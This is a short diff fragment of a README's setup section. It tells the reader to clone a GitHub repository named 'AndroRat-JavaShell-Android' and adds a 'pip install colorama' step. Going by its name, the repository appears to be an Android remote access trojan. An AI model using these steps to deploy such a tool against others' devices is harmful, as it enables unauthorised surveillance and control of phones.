@@ -8,9 +8,11 @@ GitHub Account - You need a GitHub account for using GitHub Actions.
 
 Setup Instructions
 Clone the Repository
-
+    
     git clone https://github.com/khilesh114/AndroRat-JavaShell-Android
     cd AndroRat-JavaShell-Android
+    pip install colorama
+
 
 Run the Setup Script
 
